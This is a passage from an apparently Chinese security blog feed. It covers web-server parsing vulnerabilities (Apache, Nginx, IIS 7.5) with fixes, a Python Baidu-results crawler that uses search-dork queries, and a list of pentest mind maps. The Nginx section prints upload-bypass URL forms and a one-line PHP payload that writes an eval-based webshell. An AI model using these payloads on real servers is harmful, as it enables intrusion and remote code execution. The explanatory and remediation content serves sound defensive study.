<h3 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h3><p>1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;Files ~ “.(php.|php3.)”&gt;</div><div class="line">Order Allow,Deny</div><div class="line">Deny from all</div><div class="line">&lt;/Files&gt;</div></pre></td></tr></table></figure></p>
<p>2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so<br>把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;IfModule mod_rewrite.c&gt;</div><div class="line">RewriteEngine On</div><div class="line">RewriteRule .(php.|php3.) /index.php</div><div class="line">RewriteRule .(pHp.|pHp3.) /index.php</div><div class="line">RewriteRule .(phP.|phP3.) /index.php</div><div class="line">RewriteRule .(Php.|Php3.) /index.php</div><div class="line">RewriteRule .(PHp.|PHp3.) /index.php</div><div class="line">RewriteRule .(PhP.|PhP3.) /index.php</div><div class="line">RewriteRule .(pHP.|pHP3.) /index.php</div><div class="line">RewriteRule .(PHP.|PHP3.) /index.php</div><div class="line">&lt;/IfModule&gt;</div></pre></td></tr></table></figure></p>
<h2 id="三-Nginx-lt-8-03畸形解析漏洞"><a href="#三-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="三.Nginx &lt; 8.03畸形解析漏洞"></a>三.Nginx &lt; 8.03畸形解析漏洞</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<h3 id="漏洞形式-1"><a href="#漏洞形式-1" class="headerlink" title="漏洞形式"></a>漏洞形式</h3><p>www.xxxx.com/UploadFiles/image/1.jpg/1.php<br>www.xxxx.com/UploadFiles/image/1.jpg%00.php<br>www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</p>
<p>另外一种手法：上传一个名字为test.jpg，以下内容的文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;</div></pre></td></tr></table></figure></p>
<p>然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>
<h3 id="修复方案-2"><a href="#修复方案-2" class="headerlink" title="修复方案"></a>修复方案</h3><p>1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;<br>2.在Nginx配置文件中添加以下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">if ( $fastcgi_script_name ~ ..*/.*php ) &#123;</div><div class="line"></div><div class="line">　　 return 403;</div><div class="line">　　 &#125;</div></pre></td></tr></table></figure></p>
<p>这行代码的意思是当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。<br>3.升级Nignx到最新版</p>
<h2 id="四-IIS7-5解析漏洞"><a href="#四-IIS7-5解析漏洞" class="headerlink" title="四.IIS7.5解析漏洞"></a>四.IIS7.5解析漏洞</h2><p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;服务器解析漏洞已经是一个老生常谈问题了，但是有些服务器依然存在，这里复习记录一下常见服务器解析漏洞，比如IIS6.0，IIS7.5，acache，nginx解析漏洞。&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://y-hkl.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="服务器解析漏洞" scheme="http://y-hkl.top/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>爬取百度搜索</title>
    <link href="http://y-hkl.top/2017/09/01/%E7%88%AC%E5%8F%96%E7%99%BE%E5%BA%A6%E6%90%9C%E7%B4%A2/"/>
    <id>http://y-hkl.top/2017/09/01/爬取百度搜索/</id>
    <published>2017-09-01T06:31:09.000Z</published>
    <updated>2017-09-01T06:59:40.459Z</updated>
    
    <content type="html"><![CDATA[<p>在用谷歌语法搜索有某些特征的链接时，如果想把这些链接全部保存起来，这个时候就可以使用爬虫技术，爬取这些链接保存下来。下面就来分析并写出这个爬虫程序。<br><a id="more"></a></p>
<h2 id="网页分析"><a href="#网页分析" class="headerlink" title="网页分析"></a>网页分析</h2><h3 id="分析搜索链接"><a href="#分析搜索链接" class="headerlink" title="分析搜索链接"></a>分析搜索链接</h3><p>每页的网页链接格式，一般都有固定的链接格式，如百度的每页搜索结果链接是只取两个个参数的结果是这样，每页10条<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.baidu.com/s?wd=ctf&amp;pn=10</div></pre></td></tr></table></figure></p>
<h3 id="分析搜索页面中的链接"><a href="#分析搜索页面中的链接" class="headerlink" title="分析搜索页面中的链接"></a>分析搜索页面中的链接</h3><p>F12对当前页面分析每个链接的特点，百度搜索有点坑，你会发现百度都是通过一个长长的链接302跳转来访问的，随便选取一个链接都是这种<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a target=&quot;_blank&quot; href=&quot;你搜索的URL&quot; class=&quot;c-showurl&quot; style=&quot;text-decoration:none;&quot;&gt;www.php.net/downloa...php</div></pre></td></tr></table></figure></p>
<p>特征就是class=”c-showurl” 属性值，用bs库去获取所有有这个属性的tagres = soup.find_all(name=”a”, attrs={‘class’:’c-showurl’})</p>
<h3 id="访问链接"><a href="#访问链接" class="headerlink" title="访问链接"></a>访问链接</h3><p>访问跳转链接获取实际网站url,title之类的信息</p>
<h2 id="爬虫实现"><a href="#爬虫实现" class="headerlink" title="爬虫实现"></a>爬虫实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"></div><div class="line"><span class="comment">#输入格式  python 脚本 -s 内容 -f 要保存的文件名</span></div><div class="line"></div><div class="line"><span class="comment">#每页的网页链接格式，一般都有固定的链接格式，如百度的每页搜索结果链接是只取两个个参数的结果是这样，每页10条</span></div><div class="line"><span class="comment">#https://www.baidu.com/s?wd=ctf&amp;pn=10</span></div><div class="line"><span class="comment">#F12对当前页面分析每个链接的特点，百度搜索有点坑，你会发现百度都是通过一个长长的链接302跳转来访问的，随便选取一个链接都是这种</span></div><div class="line"><span class="comment">#&lt;a target="_blank" href="http://www.baidu.com/link?url=GI9K125i3rnLbxL2-kKs-2g2OZt-oDTJZZIFjndQHxGiDubfIEpvNxnnCc1h5ags" class="c-showurl" style="text-decoration:none;"&gt;www.secbox.cn/tag/&lt;b&gt;ctf&lt;/b&gt;&amp;nbsp;&lt;/a&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests	</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> bs</div><div class="line"><span class="keyword">import</span> threading	<span class="comment">#多线程</span></div><div class="line"><span class="keyword">import</span> re  <span class="comment">#正则</span></div><div class="line"><span class="keyword">from</span> Queue <span class="keyword">import</span> Queue  <span class="comment">#线程优先级队列（ Queue）</span></div><div class="line"><span class="keyword">from</span> prettytable <span class="keyword">import</span> PrettyTable  <span class="comment">#将输出内容如表格方式整齐 </span></div><div class="line"><span class="keyword">import</span> argparse  <span class="comment">#命令行解析</span></div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">thread_count = <span class="number">3</span> <span class="comment">#进程数</span></div><div class="line">page = <span class="number">5</span> <span class="comment">#可以修改抓取页数</span></div><div class="line">urls = []</div><div class="line"></div><div class="line">table =  PrettyTable([<span class="string">'page'</span>,<span class="string">'url'</span>,<span class="string">'title'</span>]) <span class="comment">#prettyx模块将输出内容如表格方式整齐</span></div><div class="line">table.align[<span class="string">'title'</span>] = <span class="string">'1'</span> <span class="comment">#title左对齐</span></div><div class="line">table.padding_width = <span class="number">1</span>  <span class="comment">#列边和内容之间的一个空格</span></div><div class="line"></div><div class="line">page = (page+<span class="number">1</span>) * <span class="number">10</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">mythread</span><span class="params">(threading.Thread)</span>:</span>  <span class="comment">#继承父类threading.Thread</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,queue)</span>:</span></div><div class="line">		threading.Thread.__init__(self)</div><div class="line">		self.Q = queue</div><div class="line">		self.headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'</span>&#125;  <span class="comment">#设置请求头</span></div><div class="line"></div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span>   <span class="comment">##把要执行的代码写到run函数里面 线程在创建后会直接运行run函数 </span></div><div class="line">		<span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				t = self.Q.get(<span class="keyword">True</span>,<span class="number">1</span>)</div><div class="line">				<span class="comment">#print t</span></div><div class="line">				self.spider(t)</div><div class="line">			<span class="keyword">except</span> Exception,e:  <span class="comment">#调试最好打印出错信息，否则，spider函数出错也无法定位错误，多次遇到这个问题了,靠打印才解决</span></div><div class="line">				<span class="keyword">print</span> e</div><div class="line">				<span class="keyword">break</span></div><div class="line"></div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">spider</span><span class="params">(self,target)</span>:</span>  <span class="comment">#爬取网页链接和标题</span></div><div class="line">		<span class="comment">#print type(target)</span></div><div class="line">		pn =int(target.split(<span class="string">'='</span>)[<span class="number">-1</span>])/<span class="number">10</span> + <span class="number">1</span>  <span class="comment">#对https://www.baidu.com/s?wd=ctf&amp;pn=10分割去最后的数字</span></div><div class="line">		<span class="comment">#print pn</span></div><div class="line">		<span class="comment">#print target</span></div><div class="line">		html = requests.get(target,headers=self.headers)</div><div class="line">		<span class="comment">#print html</span></div><div class="line">		soup = bs(html.text,<span class="string">'lxml'</span>)</div><div class="line">		res = soup.find_all(name=<span class="string">'a'</span>, attrs=&#123;<span class="string">'class'</span>:<span class="string">'c-showurl'</span>&#125;)</div><div class="line">		<span class="comment">#print res</span></div><div class="line">	</div><div class="line">		<span class="keyword">for</span> r <span class="keyword">in</span> res:</div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				<span class="comment">#因为百度搜索是302跳转，所以我们需要再次请求</span></div><div class="line">				h = requests.get(r[<span class="string">'href'</span>],headers=self.headers,timeout=<span class="number">3</span>)</div><div class="line">				<span class="keyword">if</span> h.status_code == <span class="number">200</span>:</div><div class="line">					url = h.url</div><div class="line">					title =re.findall(<span class="string">r'&lt;title&gt;(.*?)&lt;/title&gt;'</span>,h.content)[<span class="number">0</span>]</div><div class="line">					title = title.decode(<span class="string">'utf-8'</span>)  <span class="comment">#解码成unicode,否则add_row会转换出错</span></div><div class="line">					urls.append((pn,url,title))</div><div class="line">				<span class="keyword">else</span>:</div><div class="line">					<span class="keyword">continue</span></div><div class="line">			<span class="keyword">except</span>:</div><div class="line">				<span class="keyword">continue</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Load_Thread</span><span class="params">(queue)</span>:</span>   <span class="comment">#生成线程数</span></div><div class="line">	<span class="keyword">return</span> [mythread(queue) <span class="keyword">for</span> i <span class="keyword">in</span> range(thread_count)]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Start_Thread</span><span class="params">(threads)</span>:</span></div><div class="line">	<span class="keyword">print</span> <span class="string">'thread is start...'</span></div><div class="line">	<span class="keyword">for</span> t <span class="keyword">in</span> threads:</div><div class="line">		t.setDaemon(<span class="keyword">True</span>)</div><div class="line">		t.start()</div><div class="line">	<span class="keyword">for</span> t <span class="keyword">in</span> threads:</div><div class="line">		t.join()</div><div class="line">	<span class="keyword">print</span> <span class="string">'thread is end...'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">	start = time.time()</div><div class="line">	parser = argparse.ArgumentParser()</div><div class="line">	parser.add_argument(<span class="string">'-s'</span>)</div><div class="line">	parser.add_argument(<span class="string">'-f'</span>)</div><div class="line">	arg = parser.parse_args()</div><div class="line">	<span class="comment">#print arg</span></div><div class="line">	</div><div class="line">	word = arg.s</div><div class="line">	output = arg.f</div><div class="line">	<span class="comment"># word = 'inurl:login.action'</span></div><div class="line">	<span class="comment"># output = 'test.txt'</span></div><div class="line">	queue = Queue()</div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,page,<span class="number">10</span>):</div><div class="line">		target = <span class="string">'https://www.baidu.com/s?wd=%s&amp;pn=%s'</span>%(word,i)</div><div class="line">		queue.put(target)</div><div class="line">	thread_list = Load_Thread(queue)</div><div class="line">	Start_Thread(thread_list)</div><div class="line">	</div><div class="line">	<span class="comment">#把数据写到文件中</span></div><div class="line">	<span class="keyword">if</span> output:</div><div class="line">		<span class="keyword">with</span> open(output,<span class="string">'a'</span>) <span class="keyword">as</span> f:</div><div class="line">			<span class="keyword">for</span> record <span class="keyword">in</span> urls:</div><div class="line">				f.write(record[<span class="number">1</span>]+<span class="string">'\n'</span>)</div><div class="line">	<span class="comment">#print urls,len(urls)</span></div><div class="line">	<span class="keyword">for</span> record <span class="keyword">in</span> urls:</div><div class="line">		table.add_row(list(record))  <span class="comment">#在表单中添加数据</span></div><div class="line">	<span class="keyword">print</span> table</div><div class="line">	<span class="keyword">print</span> <span class="string">'共爬取数据%s条'</span>%len(urls)</div><div class="line">	<span class="keyword">print</span> time.time()-start</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	main()</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在用谷歌语法搜索有某些特征的链接时，如果想把这些链接全部保存起来，这个时候就可以使用爬虫技术，爬取这些链接保存下来。下面就来分析并写出这个爬虫程序。&lt;br&gt;
    
    </summary>
    
      <category term="爬虫技术" scheme="http://y-hkl.top/categories/%E7%88%AC%E8%99%AB%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="python爬虫" scheme="http://y-hkl.top/tags/python%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试常用脑图</title>
    <link href="http://y-hkl.top/2017/08/31/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E8%84%91%E5%9B%BE/"/>
    <id>http://y-hkl.top/2017/08/31/渗透测试常用脑图/</id>
    <published>2017-09-01T03:00:44.000Z</published>
    <updated>2017-09-01T09:37:27.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透测试脑图"><a href="#渗透测试脑图" class="headerlink" title="渗透测试脑图"></a>渗透测试脑图</h2><p><img src="/upload_img/penetration_test.png" alt=""></p>
<h2 id="漏洞脑图"><a href="#漏洞脑图" class="headerlink" title="漏洞脑图"></a>漏洞脑图</h2><h3 id="web常见漏洞脑图"><a href="#web常见漏洞脑图" class="headerlink" title="web常见漏洞脑图"></a>web常见漏洞脑图</h3><p><img src="/upload_img/web_mind_map.png" alt=""></p>
<h3 id="xss攻击点汇总脑图"><a href="#xss攻击点汇总脑图" class="headerlink" title="xss攻击点汇总脑图"></a>xss攻击点汇总脑图</h3><p><img src="/upload_img/xss_attacks.png" alt=""></p>
<h3 id="密码找回逻辑漏洞脑图"><a href="#密码找回逻辑漏洞脑图" class="headerlink" title="密码找回逻辑漏洞脑图"></a>密码找回逻辑漏洞脑图</h3><p><img src="/upload_img/password_recovery_logic_vulnerability.png" alt=""></p>
<h3 id="越权脑图"><a href="#越权脑图" class="headerlink" title="越权脑图"></a>越权脑图</h3><p><img src="/upload_img/unauthorized.png" alt=""></p>
<h2 id="工具脑图"><a href="#工具脑图" class="headerlink" title="工具脑图"></a>工具脑图</h2><h3 id="sqlmap脑图"><a href="#sqlmap脑图" class="headerlink" title="sqlmap脑图"></a>sqlmap脑图</h3><p><img src="/upload_img/sqlmap.png" alt=""></p>
<h3 id="nmap脑图"><a href="#nmap脑图" class="headerlink" title="nmap脑图"></a>nmap脑图</h3><p><img src="/upload_img/nmap.png" alt=""></p>
<h2 id="提权脑图"><a href="#提权脑图" class="headerlink" title="提权脑图"></a>提权脑图</h2><p><img src="/upload_img/privilge_escalation.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;渗透测试脑图&quot;&gt;&lt;a href=&quot;#渗透测试脑图&quot; class=&quot;headerlink&quot; title=&quot;渗透测试脑图&quot;&gt;&lt;/a&gt;渗透测试脑图&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/upload_img/penetration_test.png&quot; alt=&quot;&quot;&gt;&lt;/p
    
    </summary>
    
      <category term="web安全" scheme="http://y-hkl.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="漏洞" scheme="http://y-hkl.top/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="脑图" scheme="http://y-hkl.top/tags/%E8%84%91%E5%9B%BE/"/>
    
  </entry>
  
</feed>
